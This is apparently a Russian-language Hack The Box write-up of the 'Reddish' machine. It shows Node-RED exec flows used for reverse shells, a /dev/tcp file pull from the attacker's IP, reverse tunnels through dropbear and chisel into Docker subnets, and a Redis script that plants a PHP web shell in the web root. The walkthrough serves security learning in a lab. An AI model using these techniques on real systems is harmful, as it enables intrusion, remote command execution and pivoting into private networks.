---
layout: post
title: "HTB{ Reddish }"
date: 2020-03-17 18:00:00 +0300
author: snovvcrash
categories: /pentest
tags: [xakepru, write-up, hackthebox, machine, linux, node-red, lse.sh, networking, host-discovery, ping-sweep, static-nmap, pivoting, ssh-reverse-tcp, dropbear, tunneling, port-forwarding, chisel, upx, file-transfer, redis, rsync, docker, docker-compose]
comments: true
published: true
---

[//]: # (2020-02-17)

Что делать в случае, когда тебе нужно захватить контроль над хостом, который находится в другой подсети? Верно — много запутанных туннелей! На примере виртуалки **Reddish** с Hack The Box мы встретимся со средой визуального программирования Node-RED, где в прямом смысле «построим» реверс-шелл, проэксплуатируем слабую конфигурацию СУБД Redis, воспользуемся инструментом зеркалирования файлов rsync для доступа к чужой файловой системе, а также создадим целое множество вредоносных задач cron всех сортов и расцветок. И что самое интересное — все управление хостом будет выполняться посредством маршрутизации трафика по докер-контейнерам через несколько TCP-туннелей. Погнали!

<!--cut-->

<p align="right">
	<a href="https://hackmag.com/security/htb-reddish/"><img src="https://img.shields.io/badge/F-HackMag-26a0c4?style=flat-square" alt="hackmag-badge.svg" /></a>
	<a href="https://xakep.ru/2020/02/17/htb-reddish/"><img src="https://img.shields.io/badge/%5d%5b-%d0%a5%d0%b0%d0%ba%d0%b5%d1%80-red?style=flat-square" alt="xakep-badge.svg" /></a>
	<a href="https://www.hackthebox.eu/home/machines/profile/147"><img src="https://img.shields.io/badge/%e2%98%90-Hack%20The%20Box-8ac53e?style=flat-square" alt="htb-badge.svg" /></a>
	<span class="score-insane">8/10</span>
</p>

![banner.png](/assets/images/htb/machines/reddish/banner.png)
{:.center-image}

![info.png](/assets/images/htb/machines/reddish/info.png)
{:.center-image}

* TOC
{:toc}

[*Приложения*](https://github.com/snovvcrash/xakepru/tree/master/htb-reddish)

# Разведка

В этом разделе будет собрана необходима информация для дальнейшего проникновения вглубь системы.

## Сканирование портов

Расчехляем Nmap, и в бой! Забегая вперед, сразу скажу, что дефолтные 1000 портов, которые Nmap сканирует в первую очередь, оказались закрыты. Поэтому будем исследовать весь диапазон TCP на высокой скорости.

```
root@kali:~# nmap -n -Pn --min-rate=5000 -oA nmap/tcp-allports 10.10.10.94 -p-
root@kali:~# cat nmap/tcp-allports.nmap
...
Host is up (0.12s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
1880/tcp open  vsat-control
...
```

После полного сканирования, как можно видеть, откликнулся только один неизвестный на первый взгляд 1880-й порт. Попробуем вытащить из него больше информации.

```
root@kali:~# nmap -n -Pn -sV -sC -oA nmap/tcp-port1880 10.10.10.94 -p1880
root@kali:~# cat nmap/tcp-port1880.nmap
...
PORT     STATE SERVICE VERSION
1880/tcp open  http    Node.js Express framework
|_http-title: Error
...
```

Сканер говорит, что на этом порту развернут [Express](https://ru.wikipedia.org/wiki/Express.js) — фреймворк веб-приложений Node.js. Когда видишь приставку «веб» — верно, в первую очередь открываем браузер...

## Веб — порт 1880

Все, что нам было суждено узнать после перехода на страницу `http://10.10.10.94:1880/` — лишь немногословное сообщение об ошибке.

![web-cannot-get-error.png](/assets/images/htb/machines/reddish/web-cannot-get-error.png)
{:.center-image}

На этом этапе есть два пути разобраться, что за приложение висит на этом порту:

1. Сохранить [значок веб-сайта](https://raw.githubusercontent.com/snovvcrash/xakepru/master/htb-reddish/favicon.ico) к себе на машину (обычно они живут по адресу `/favicon.ico`) и попытаться найти, на что он похож, с помощью [Reverse Image Search](https://tineye.com/).
2. Спросить у поисковика, с чем чаще всего бывает ассоциирован порт `1880`.

Второй вариант более «казуальный», однако не менее эффективный: уже на первой ссылке [по такому запросу](https://lmgtfy.com/?q=tcp+port+1880) мне открылась Истина.

![web-port1880-details.png](/assets/images/htb/machines/reddish/web-port1880-details.png)
{:.center-image}

**Node-RED**

Если верить [официальному сайту](https://nodered.org/), Node-RED — это такая среда для визуального программирования, где можно конструировать взаимосвязи между разными сущностями (от локальных железок до API онлайн-сервисов). Чаще всего, как я понял, о Node-RED [говорят](https://habr.com/ru/post/396985/) в контексте управления умным домом в частности и девайсами IoT в целом.

Окей, софт мы идентифицировали, но ошибка доступа к веб-странице от этого никуда не делась.

```
root@kali:~# curl -i http://10.10.10.94:1880
HTTP/1.1 404 Not Found
X-Powered-By: Express
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
Content-Length: 139
Date: Thu, 30 Jan 2020 21:53:05 GMT
Connection: keep-alive

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /</pre>
</body>
</html>
```

Первое, что приходит в голову — запустить брутер директорий. Но прежде, чем это сделать, попробуем поменять метод запроса с GET на POST.

```
root@kali:~# curl -i -X POST http://10.10.10.94:1880
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 86
ETag: W/"56-dJUoKg9C3oMp/xaXSpD6C8hvObg"
Date: Thu, 30 Jan 2020 22:04:20 GMT
Connection: keep-alive

{"id":"a237ac201a5e6c6aa198d974da3705b8","ip":"::ffff:10.10.14.19","path":"/red/{id}"}
```

Ну вот и обошлось безо всяких там брутеров. Видим, что при обращении к корню веб-сайта через POST сервер отвечает примером того, как должно выглядеть тело запроса. В принципе, до этого можно дойти логически: тонны примеров именно **POST-**запросов можно видеть в [документации к API](https://nodered.org/docs/api/) Node-RED.

Итак, при переходе по `http://10.10.10.94:1880/red/a237ac201a5e6c6aa198d974da3705b8/` мы видим следующую картину.

![web-node-red-workspace.png](/assets/images/htb/machines/reddish/web-node-red-workspace.png)
{:.center-image}

Давай разбираться, что здесь можно наворотить.

## Node-RED Flow

Первая ассоциация, которая приходит на ум при виде рабочей области Node-RED — «песочница». Без лишних доказательств я понял, что эта штука способна на многое, однако мне нужно всего ничего: способ получить шелл на сервере.

![web-node-red-nodes.png](/assets/images/htb/machines/reddish/web-node-red-nodes.png)
{:.center-image}

Пролистав вниз панель «строительных блоков» (или «узлов», как называет их Node-RED) слева, я увидел вкладку Advanced, где спряталась столь дорогая сердцу любого хакера функция **exec**.

**Spice must FLOW**

В философии Node-RED каждая комбинация, которую ты соберешь в рабочей области, называется «флоу» (или «поток»). Потоки можно строить, выполнять, импортировать и экспортировать в JSON. При нажатии на кнопку Deploy сервером (как ни странно) деплоятся все потоки со всех вкладок рабочей области.

### simple-shell

Попробуем что-нибудь построить, тогда все станет более очевидно. Первым потоком, который я задеплоил, стал тривиальный шелл.

![web-node-red-simple-shell.png](/assets/images/htb/machines/reddish/web-node-red-simple-shell.png)
{:.center-image}

Будем обращаться к тому, что изображено на картинке, по цветам блоков:

* Серый (слева): получение данных на вход. Сервер выполняет обратное подключение к моему IP и привязывает мой ввод с клавиатуры к оранжевому блоку exec.
* Оранжевый: функция выполнения команд на сервере. Результат работы данного блока поступает на вход второму серому блоку. Обрати внимание: у оранжевого блока есть три выходных «клеммы». Они соответствуют `stdout`, `stderr` и коду возврата (который я не стал использовать).
* Серый (справа): отправка выходных данных. Если открыть расширенные настройки блока (двойным кликом), можно задать особенности его поведения. Я выбрал Reply to TCP, чтобы Node-RED отправлял мне ответы в этом же подключении.

О двух серых блоках можно думать, как о сетевых пайпах, по которым идет INPUT и OUTPUT блока exec. Я оставлю экспортированный поток в JSON у себя [на GitHub](https://github.com/snovvcrash/xakepru/blob/master/htb-reddish/node-red/simple-shell.json), чтобы не засорять тело статьи.

Далее поднимем локального слушателя на Kali и устроим деплой!

![web-node-red-simple-shell-ex.png](/assets/images/htb/machines/reddish/web-node-red-simple-shell-ex.png)
{:.center-image}

Как можно видеть — обыкновенный non-PTY шелл.

### beautiful-shell

Конечно, мне было интересно поиграть в такой песочнице, поэтому я собрал еще несколько конструкций.

![web-node-red-beautiful-shell.png](/assets/images/htb/machines/reddish/web-node-red-beautiful-shell.png)
{:.center-image}

Это более аккуратный шелл с возможностью отправки запроса на подключения «с кнопки» (синий) без необходимости редеплоить весь проект, логированием (зеленый) происходящего в веб-интерфейс (см. рисунок ниже) и форматированием вывода команд под свой шаблон (желтый).

![web-node-red-beautiful-shell-ex.png](/assets/images/htb/machines/reddish/web-node-red-beautiful-shell-ex.png)
{:.center-image}

![web-node-red-beautiful-shell-debug.png](/assets/images/htb/machines/reddish/web-node-red-beautiful-shell-debug.png)
{:.center-image}

Исходник в JSON-ке [здесь](https://github.com/snovvcrash/xakepru/blob/master/htb-reddish/node-red/beautiful-shell.json).

### file-upload

Раз такое дело, почему бы не соорудить флоу для заливки файлов на сервер.

![web-node-red-file-upload.png](/assets/images/htb/machines/reddish/web-node-red-file-upload.png)
{:.center-image}

Здесь все совсем просто: по нажатию на кнопку Connect сервер подключается к порту `8889` моей машины (где уже поднят листенер с нужным файлом) и сохраняет полученную информацию у себя в скрытый файл `/tmp/.file` ([JSON](https://github.com/snovvcrash/xakepru/blob/master/htb-reddish/node-red/file-upload.json)).

Испытаем этот поток в деле: я запускаю `nc` на Kali с указанием передать скрипт для проведения локальной разведки на Linux [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration) (который я начал использовать вместо привычного [LinEnum.sh](https://github.com/rebootuser/LinEnum)), дожидаюсь окончания загрузки и проверяю контрольные суммы обоих копий.

На Kali:

```
root@kali:~# nc -lvnp 8889 < lse.sh
...
root@kali:~# md5sum lse.sh
7d3a4fe5c7f91692885bbeb631f57c70  lse.sh
```

![web-node-red-file-upload-ex.png](/assets/images/htb/machines/reddish/web-node-red-file-upload-ex.png)
{:.center-image}

На Node-RED:

```
root@nodered:/tmp# md5sum .file
7d3a4fe5c7f91692885bbeb631f57c70  .file
```

**Загрузка файлов из командной строки**

Откровенно говоря, такой подход к трансферу файлов избыточен, ведь всю процедуру можно провести, не отходя от терминала.

```
root@kali:~# nc -w3 -lvnp 8889 < lse.sh
root@nodered:~# bash -c 'cat < /dev/tcp/10.10.14.19/8889 > /tmp/.file'
```

### reverse-shell

Я не был доволен тем шеллом, который был построен из абстракций Node-RED (некорректно читались некоторые символы, и вообще вся эта конструкция выглядела очень ненадежно), поэтому я получил полноценный Reverse Shell.

![nodered-reverse-shell.png](/assets/images/htb/machines/reddish/nodered-reverse-shell.png)
{:.center-image}

Сперва я сделал это, как показано выше — путем открытия еще одного порта в новой вкладки терминала и вызовом [реверс-шелла](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp) на Bash по TCP. Однако позже я решил упростить себе жизнь на случай, если придется перезапускать сессию, и собрал такой флоу в Node-RED ([JSON](https://github.com/snovvcrash/xakepru/blob/master/htb-reddish/node-red/reverse-shell.json)).

![web-node-red-reverse-shell.png](/assets/images/htb/machines/reddish/web-node-red-reverse-shell.png)
{:.center-image}

Обрати внимание, что я завернул пейлоад для реверс-шелла в дополнительную оболочку Bash `bash -c '<PAYLOAD>'`. Это сделано для того, чтобы команда была выполнена именно итерпретатором Bash, так как дефолтный шелл на этом хосте — [dash](https://ru.wikipedia.org/wiki/Debian_Almquist_shell).

```
node-red> ls -la /bin/sh
lrwxrwxrwx 1 root root 4 Nov  8  2014 /bin/sh -> dash
```

Теперь я могу написать простой [Bash-скрипт](https://github.com/snovvcrash/xakepru/blob/master/htb-reddish/ping-sweep.sh), чтобы триггерить callback в один клик из командной строки.

```bash
#!/usr/bin/env bash

(sleep 0.5; curl -s -X POST http://10.10.10.94:1880/red/a237ac201a5e6c6aa198d974da3705b8/inject/7635e880.e6be48 >/dev/null &)
rlwrap nc -lvnp 8888
```

Адрес URL, который я передаю `curl` — тот адрес, где расположился объект Inject данного потока (то есть кнопка *Go!* на рисунке выше). Также я использую [rlwrap](https://github.com/hanslub42/rlwrap), чтобы не сойти с ума от невозможности использовать стрелки влево-вправо для перемещения по вводимой строке и вверх-вниз для перемещения по истории команд.

У нас есть шелл, поэтому пора разобраться, куда мы попали.

# Докер. Контейнер I: "nodered"

Уже с первых секунд пребывания на сервере становится очевидно, что мы внутри докера, так как наш шелл вернулся от имени суперпользователя root.

Это же предположение подтверждает скрипт lse.sh, заброшенный на машину в прошлом параграфе.

![nodered-lse-out.png](/assets/images/htb/machines/reddish/nodered-lse-out.png)
{:.center-image}

Ну а если ты и ему не веришь, можно убедиться в этом лично: в корне файловой системы (далее «ФС») существует директория `.dockerenv`.

```
root@nodered:/node-red# ls -la /.dockerenv
-rwxr-xr-x 1 root root 0 May  4  2018 /.dockerenv
```

Если ты оказался в докере, первым делом рекомендуется проверить сетевое окружение на случай, если это не единичный контейнер в цепочке. В текущей системе отсутствует `ifconfig`, поэтому информацию о сетевых интерфейсах будем смотреть с помощью `ip addr`.

![nodered-ip-addr.png](/assets/images/htb/machines/reddish/nodered-ip-addr.png)
{:.center-image}

Как видно, этот докер может общаться с двумя подсетями: `172.18.0.0/16` и `172.19.0.0/16`. В первой подсети контейнер (будем называть его `nodered`) имеет IP-адрес `172.18.0.2`, а во второй — `172.19.0.4`. Посмотрим, с какими еще хостами взаимодействовал `nodered`.

![nodered-arp-cache.png](/assets/images/htb/machines/reddish/nodered-arp-cache.png)
{:.center-image}

Кэш ARP указывает на то, что `nodered` знает как минимум еще два хоста: `172.19.0.2` и `172.19.0.3` (хосты `.1` не беру во внимание, так как, скорее всего, это [шлюзы по умолчанию](https://ru.wikipedia.org/wiki/%D0%A8%D0%BB%D1%8E%D0%B7_%D0%BF%D0%BE_%D1%83%D0%BC%D0%BE%D0%BB%D1%87%D0%B0%D0%BD%D0%B8%D1%8E) к хостовой ОС).

Проведем сканирование с целью **обнаружения хостов**.

## Host Discovery

«Пробить» сетевое окружение можно разными способами.

### Ping Sweep

Первый способ — написать простой скрипт, который позволит «простучать» всех участников сети техникой [Ping Sweep](https://en.wikipedia.org/wiki/Ping_sweep). Идея проста: отправим по одному ICMP-запросу на каждый хост уровня L2 сети `172.18.0.0` (или просто `172.18.0.0/24`) и посмотрим на код возврата. Если успех — выводим сообщение на экран, иначе — ничего не делаем.

```bash
#!/usr/bin/env bash

IP="$1"; for i in $(seq 1 254); do (ping -c1 $IP.$i >/dev/null && echo "ON: $IP.$i" &); done
```

Всего может быть 254 хоста (`256` минус `адрес_сети` минус `адрес_широковещателя`) в сканируемом участке сети. Чтобы выполнить эту проверку за 1 секунду, а не за 254, будем запускать каждый `ping` в своем шелл-процессе. Это не затратно, так как они будут быстро умирать, и я получу практически мгновенный результат.

```
root@nodered:~# IP="172.18.0"; for i in $(seq 1 254); do (ping -c1 $IP.$i >/dev/null && echo "ON: $IP.$i" &); done
ON: 172.18.0.1  <-- Шлюз по умолчанию для nodered (хост)
ON: 172.18.0.2  <-- Докер-контейнер nodered
```

При сканировании этой подсетки получили только гейтвей и свой же контейнер. Неинтересно, пробуем `172.19.0.0/24`.

```
root@nodered:~# IP="172.19.0"; for i in $(seq 1 254); do (ping -c1 $IP.$i >/dev/null && echo "ON: $IP.$i" &); done
ON: 172.19.0.1  <-- Шлюз по умолчанию для nodered (хост)
ON: 172.19.0.2  <-- ???
ON: 172.19.0.3  <-- ???
ON: 172.19.0.4  <-- Докер-контейнер nodered
```

Есть два незвестных хоста, которые мы вскоре отправимся изучать, но прежде еще один способ проведения Host Discovery.

### Статический Nmap

Забросим на `nodered` копию [статически скомпилированного Nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) вместе с файлом `/etc/services` со своей Kali (он содержит ассоциативный маппинг `имя_службы <--> номер_порта`, необходимый для работы сканера) и запустим обнаружение хостов.

```
root@nodered:/tmp# ./nmap -n -sn 172.18.0.0/24 2>/dev/null | grep -e 'scan report' -e 'scanned in'
Nmap scan report for 172.18.0.1
Nmap scan report for 172.18.0.2
Nmap done: 256 IP addresses (2 hosts up) scanned in 2.01 seconds
```

Nmap нашел два хоста в подсети `172.18.0.0/24`.

```
root@nodered:/tmp# ./nmap -n -sn 172.19.0.0/24 2>/dev/null | grep -e 'scan report' -e 'scanned in'
Nmap scan report for 172.19.0.1
Nmap scan report for 172.19.0.2
Nmap scan report for 172.19.0.3
Nmap scan report for 172.19.0.4
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.02 seconds
```

И четыре хоста в подсети `172.19.0.0/24`. Все в точности, как и при ручном Ping Sweep.

## Сканирование неизвестных хостов

Для того, чтобы выяснить, какие порты открыты на двух неизвестных хостах, можно снова написать такой [однострочник](https://github.com/snovvcrash/xakepru/blob/master/htb-reddish/port-scan.sh) на Bash.

```bash
#!/usr/bin/env bash

IP="$1"; for port in $(seq 1 65535); do (echo '.' >/dev/tcp/$IP/$port && echo "OPEN: $port" &) 2>/dev/null; done
```

Работать он будет примерно так же, как и `ping-sweep.sh`, только вместо команды `ping` здесь отправляется тестовый символ прямиком на сканируемый порт. Только вот зачем так извращаться, когда у нас уже есть Nmap?

```
root@nodered:/tmp# ./nmap -n -Pn -sT --min-rate=5000 172.19.0.2 -p-
...
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
...
Host is up (0.00017s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
6379/tcp open  unknown
...

root@nodered:/tmp# ./nmap -n -Pn -sT --min-rate=5000 172.19.0.3 -p-
...
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
...
Host is up (0.00013s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http
...
```

Обнаружили два открытых порта — по одному на каждый неизвестный хост. Сперва подумаем, как можно добраться до веба на 80-м, а потом перейдем к порту 6379.

# Туннелирование... как много в этом звуке

Чтобы добраться до удаленного 80-го порта, придется строить туннель от своей машины до хоста `172.19.0.3`. Сделать это можно по истине неисчисляемым количеством способов, например:

1. Использовать функционал Metasploit проброса маршрутов через meterpreter-сессию.
2. Иниицировать соединение Reverse SSH, где в качестве сервера будет выступать машина атакующего, а в качестве клиента — контейнер `nodered`.
3. Задействовать сторонние приложение, предназначенные непосредственно для настройки туннелей между узлами.

Еще, наверное, можно было бы воспользоваться песочницей Node-RED и попытаться придумать такой флоу, который бы осуществлял маршрутизацию трафика от атакующего до неизвестных хостов, но... Хотел бы я посмотреть на смельчака, который этим займется.

Первый пункт с Metasploit мы рассматривали [в предыдущей статье](https://snovvcrash.github.io/2020/01/26/htb-grandparents.html), поэтому повторяться не будем. Второй пункт был также [рассмотрен](https://snovvcrash.github.io/2020/01/26/htb-grandparents.html#%D1%80%D0%B5%D0%B2%D0%B5%D1%80%D1%81%D0%B8%D0%B2%D0%BD%D1%8B%D0%B9-ssh-%D1%82%D1%83%D0%BD%D0%BD%D0%B5%D0%BB%D1%8C), но речь там шла про тачки на Windows, а у нас же Линуксы... Посему план такой: сперва я быстро покажу способ реверсивного соединения с помощью SSH, а дальше перейдем к специальному софту для туннелирования.

## Reverse SSH (пример)

Для создания обратного SSH-туннеля нужен переносной клиент, который можно было бы разместить на `nodered`. Именно таким клиентом является [dropbear](https://github.com/mkj/dropbear) от австралийского разработчика Мэта Джонсона.

Скачаем исходные коды клиента [с домашней страницы](https://matt.ucc.asn.au/dropbear/) его создателя и скомпилируем его статически у себя на машине.

```
root@kali:~# wget https://matt.ucc.asn.au/dropbear/dropbear-2019.78.tar.bz2
root@kali:~# tar xjvf dropbear-2019.78.tar.bz2 && cd dropbear-2019.78
root@kali:~/dropbear-2019.78# ./configure --enable-static && make PROGRAMS='dbclient dropbearkey'
root@kali:~/dropbear-2019.78# du -h dbclient
1.4M    dbclient
```

Размер полученного бинарника — 1.4 Мб. Можно уменьшить его почти в три раза двумя простыми командами.

```
root@kali:~/dropbear-2019.78# make strip
root@kali:~/dropbear-2019.78# upx dbclient
root@kali:~/dropbear-2019.78# du -h dbclient
520K    dbclient
```

Сперва я срезал всю отладочную информацию с помощью `Makefile`, а затем сжал бинарь упаковщиком исполняемых файлов [UPX](https://ru.wikipedia.org/wiki/UPX).

Теперь сгенерируем пару «открытый/закрытый ключ» с помощью `dropbearkey` и дропнем клиент и закрытый ключ на `nodered`.

```
root@kali:~/dropbear-2019.78# ./dropbearkey -t ecdsa -s 521 -f .secret
Generating 521 bit ecdsa key, this may take a while...
Public key portion is:
ecdsa-sha2-nistp521 AAAAE2VjZHNhLXNoYTItbmlzdHA1MjEAAAAIbmlzdHA1MjEAAACFBAA2TCQk3VTYCX/hZjMmXT0/A27f5EOKQY4FbXcYeNWXIPLFQOOLnQFWbAjBa9qOUdmwOipVvDwXnvt6hEmwitflvQEIw9wHQ4spUAqs/0CR6AoiTT3w7v6CAX/uq0u2oS7gWf9SPy/Npz8Ond6XJKh+d0QPXz0uQrq0wyprCYo+g/OiEA== root@kali
Fingerprint: sha1!! ef:6a:e8:e0:f8:49:f3:cb:67:34:5d:0b:f5:cd:c0:e5:8e:49:28:41
```

![nodered-upload-dbclient.png](/assets/images/htb/machines/reddish/nodered-upload-dbclient.png)
{:.center-image}

Все, SSH-клиент вместе с 521-битный приватным ключом ([на эллиптике](https://xakep.ru/2019/08/27/elliptic-curve-cryptography/)) улетели в контейнер. Теперь создадим фиктивного пользователя с шеллом `/bin/false`, чтобы не подставлять свою машину в случае, если кто-то наткнется на закрытый ключ.

```
root@kali:~# useradd -m snovvcrash
root@kali:~# vi /etc/passwd
... Меняем шелл юзера snovvcrash на "/bin/false" ...
root@kali:~# mkdir /home/snovvcrash/.ssh
root@kali:~# vi /home/snovvcrash/.ssh/authorized_keys
... Копируем открытый ключ ...
```

Все готово, можно пробрасывать туннель.

```
root@nodered:/tmp# ./dbclient -f -N -R 8890:172.19.0.3:80 -i .secret -y snovvcrash@10.10.14.19
```

* `-f` — свернуть клиент в бэкграунд после аутентификации на сервере;
* `-N` — не выполнять команды на сервере и не запрашивать шелл;
* `-R 8890:172.19.0.3:80` — слушать `localhost:8890` на Kali и перенаправлять все, что туда попадет, на `172.19.0.3:80`;
* `-i .secret` — аутентификация по приватному ключу `.secret`;
* `-y` — автоматически добавлять хост с отпечатком его открытого ключа в список доверенных.

На Kali можно проверить успешность создания туннеля с помощью каноничного `netstat` или его новомодной альтернативы `ss`.

```
root@kali:~# netstat -alnp | grep LIST | grep 8890
tcp        0      0 127.0.0.1:8890          0.0.0.0:*               LISTEN      236550/sshd: snovvc
tcp6       0      0 ::1:8890                :::*                    LISTEN      236550/sshd: snovvc
root@kali:~# ss | grep 1880
tcp    ESTAB   0        0                                10.10.14.19:43590                         10.10.10.94:1880
```

После всего этого можно открыть браузер и на `localhost:8890` окажется тот самый эндпоинт, маршрут к которому мы прокладывали.

![www-reverse-ssh-ex.png](/assets/images/htb/machines/reddish/www-reverse-ssh-ex.png)
{:.center-image}

It works! Видеть такие надписи мне однозначно нравится.

Как я и говорил, это всего лишь пример, потому что дальше мы будем пользоваться клиент-сервером Chisel для продвижения по виртуалке Reddish.

## Chisel

> Быстрые TCP-туннели от Chisel. Транспортировка по HTTP. Безопасность по SSH. <strike>Мы новый мир построим</strike>

Ладно, возможно, разработчик [описывает](https://github.com/jpillora/chisel/blob/master/README.md) свой софт чуть менее пафосно, но у меня в голове это прозвучало именно так.

А если серьезно, то Chisel — это связка «клиент + сервер» в одном приложении, написанном на Go, которое позволяет прокладывать защищенные туннели в обход ограничений файрвола. В нашем случае мы будем использовать Chisel, чтобы настроить реверс-коннект с контейнера `rednode` до Kali. По большому счету, функционал этого инструмента очень схож с принципами организации туннелирования посредством SSH, даже синтаксис команд похож.

Чтобы не запутаться в хитросплетениях соединений, я буду вести сетевую «карту местности». Пока у нас есть информация только о `nodered` и `www`.

![network-map-1.png](/assets/images/htb/machines/reddish/network-map-1.png)
{:.center-image}

Сетевая карта. Часть 1: Начальные сведения
{:.quote}

Загрузим и соберем Chisel на Kali.

```
root@kali:~# git clone http://github.com/jpillora/chisel && cd chisel
root@kali:~/chisel# go build
root@kali:~/chisel# du -h chisel
12M     chisel
```

Объем 12 Мб — это немало в условии транспортировки исполняемого файла на машину-жертву, поэтому можно так же сжать бинарник, как мы делали это с `dropbear`: с помощью флагов линковщика `-ldflags` уберем отладочную информацию, а затем упакуем файл в UPX.

```
root@kali:~/chisel# go build -ldflags='-s -w'
root@kali:~/chisel# upx chisel
root@kali:~/chisel# du -h chisel
3.2M    chisel
```

Класс, теперь перенесем `chisel` в контейнер и создадим туннель.

```
root@kali:~/chisel# ./chisel server -v -reverse -p 8000
```

Первым действием поднимаем сервер на Kali, который слушает активность на 8000-м порту (`-p 8000`) и разрешает создание обратных подключений (`-reverse`).

```
root@nodered:/tmp# ./chisel client 10.10.14.19:8000 R:127.0.0.1:8890:172.19.0.3:80 &
```

После чего подключаемся к этому серверу с помощью клиента на `nodered`. Команда выше откроет 8890-й порт на Kali (флаг `R`), через который трафик будет попадать в 80-й порт хоста `172.19.0.3`. Если не указать сетевой интерфейс на обратном соединении явно (в данном случае это `127.0.0.1`), то будет использован `0.0.0.0`, что означает, что **любой** участник сети сможет юзать нашу машину в качестве футхолда для общения с `172.19.0.3:80`. Так как это нас не устраивает, то приходится вручную прописывать `127.0.0.1`. В этом отличие от дефолтного SSH-клиента: там по умолчанию всегда будет использован `127.0.0.1`.

![network-map-2.png](/assets/images/htb/machines/reddish/network-map-2.png)
{:.center-image}

Сетевая карта. Часть 2: Туннель до веба через nodered
{:.quote}

### Исследование веб-сайта

Если открыть `localhost:8890` в браузере, нас снова встретит радостная новость о том, что «It works!». Это мы уже видели, поэтому откроем сорцы веб-странички в поисках интересного кода.

Целиком [исходник](https://github.com/snovvcrash/xakepru/blob/master/htb-reddish/www-index.html) вставлять не буду, только скриншот с интересными моментами.

![www-web-index-source.png](/assets/images/htb/machines/reddish/www-web-index-source.png)
{:.center-image}

Комментарий (синим) гласит о том, что где-то существует контейнер с базой данных, у которой есть доступ к сетевой папке этого сервера. Аргументы функции `test` (красным) в совокупность с упоминанием некой базы данных напоминают команды [GET](https://redis.io/commands/get) и [INCR](https://redis.io/commands/INCR) в NoSQL-СУБД [Redis](https://ru.wikipedia.org/wiki/Redis). С примерами тестовых запросов через `ajax` можно поиграть в браузере и убедиться, что они и правда работают в отличии от еще нереализованной функции `backup`.

Пока все сходится, и, сдается мне, я знаю, где искать Redis: как ты помнишь, у нас оставался еще один неопознанный хост с открытым 6379-м портом... Как раз самым что ни на есть [дефолтным](https://www.speedguide.net/port.php?port=6379) портом для Redis.

### Redis

Пробросим еще один обратный туннель на Kali, который будет идти к порту `6379`.

```
root@nodered:/tmp# ./chisel client 10.10.14.19:8000 R:127.0.0.1:6379:172.19.0.2:6379 &
```

![network-map-3.png](/assets/images/htb/machines/reddish/network-map-3.png)
{:.center-image}

Сетевая карта. Часть 3: Туннель до Redis через nodered
{:.quote}

И теперь можно стучаться в гости к Redis со своей машины. К примеру, просканируем 6379-й порт с помощью Nmap — благо теперь у нас есть весь арсенал NSE для идентификации сервисов. Не забываем о флаге `-sT`, так как сырые пакеты не умеют ходить через туннели.

```
root@kali:~# nmap -n -Pn -sT -sV -sC localhost -p6379
...
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
...
```

Как предлагают [в этом посте](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html), проверим, нужна ли авторизация для взаимодействия с БД.

![redis-no-auth-req.png](/assets/images/htb/machines/reddish/redis-no-auth-req.png)
{:.center-image}

Похоже, что нет, а это значит, что можно дальше раскручивать этот вектор. Я не буду инжектить свой открытый ключ в контейнер для подключения по SSH, как советуют на Packet Storm (потому что нет самого SSH), но зато никто не запрещает залить веб-шелл в расшаренную папку веб-севера.

Общаться с СУБД можно в простом подключении netcat/telnet, однако круче скачать и собрать нативный CLI-клиент [из исходников](https://github.com/antirez/redis) самой базы данных.

```
root@kali:~# git clone https://github.com/antirez/redis && cd redis
root@kali:~/redis# make redis-cli
root@kali:~/redis# cd src/
root@kali:~/redis/src# file redis-cli
redis-cli: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c6e92b4603099564577d4027ba5fd7f20da68230, for GNU/Linux 3.2.0, with debug_info, not stripped
```

Чтобы удостовериться, что все работает, попробуем те команды, которые мы видели в сорцах веб-страницы.

![redis-redis-cli.png](/assets/images/htb/machines/reddish/redis-redis-cli.png)
{:.center-image}

Отлично, теперь можно сделать нечто более зловредное, а именно — записать веб-шелл в `/var/www/html/`. Для этого нужно:

1. [Очистить](https://redis.io/commands/flushall) ключи для всех БД.
2. [Создать](https://redis.io/commands/set) в новой БД новую пару `<ключ>, <значение>` с веб-шеллом в качестве значения.
3. [Задать имя](https://redis.io/commands/config-set) новой БД.
4. [Задать путь](https://redis.io/commands/config-set) для сохранения новой БД.
5. [Сохранить](https://redis.io/commands/save) файл новой БД.

Интересный момент: Redis оптимизирует хранение значений, если в них присутствуют повторяющиеся паттерны, поэтому не всякий пейлоад, записанный в БД, отработает корректно.

Напишем скрипт на Bash, который будет «проигрывать» эти пять шагов выше. Автоматизация нужна, так как вскоре выяснится, что веб-директория очищается каждые три минуты.

```bash
#!/usr/bin/env bash

~/redis/src/redis-cli -h localhost flushall
~/redis/src/redis-cli -h localhost set pwn '<?php system($_REQUEST['cmd']); ?>'
~/redis/src/redis-cli -h localhost config set dbfilename shell.php
~/redis/src/redis-cli -h localhost config set dir /var/www/html/
~/redis/src/redis-cli -h localhost save
```

![redis-pwn-redis.png](/assets/images/htb/machines/reddish/redis-pwn-redis.png)
{:.center-image}

Скрипт отработал успешно, поэтому можно открыть браузер и после перехода по адресу `http://localhost:8890/shell.php?cmd=whoami` тебя будет ждать такой ответ.

![www-web-shell-whoami.png](/assets/images/htb/machines/reddish/www-web-shell-whoami.png)
{:.center-image}

Таким образом, у нас есть RCE в контейнере `172.19.0.3` (будем называть его `www`, так как он сам так представился).

